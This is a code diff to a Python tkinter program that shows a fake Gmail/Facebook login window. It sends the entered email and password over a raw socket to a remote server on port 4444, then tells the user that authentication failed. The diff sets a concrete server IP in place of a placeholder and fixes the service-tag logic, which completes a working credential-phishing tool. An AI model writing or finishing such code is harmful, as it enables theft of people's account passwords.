@@ -4,7 +4,7 @@ from tkinter.ttk import *;
 from email_validator import validate_email,EmailNotValidError
 import socket;
 
-REMOTE_IP = "[Server-IP-Address]"
+REMOTE_IP = "192.168.99.62"
 REMOTE_PORT = 4444 # Server Port Number
 
 #when gmail and password check are finished, execute this login
@@ -20,7 +20,7 @@ def login(gwindow,gmail,password,isFacebook):
     # if it is gmail, the word starts with G or not it starts with F
     # G means Gmail
     # F means Facebook
-    text = f"G gmail:{gmail} and password:{password}" if isFacebook == True else f"F gmail:{gmail} and password:{password}"
+    text = f"G gmail:{gmail} and password:{password}" if isFacebook == False else f"F gmail:{gmail} and password:{password}"
     client.send(text.encode())
     result = client.recv(1024)
     mylabel.config(text="Fail to authenticate,\n Check your email or try next authentication")
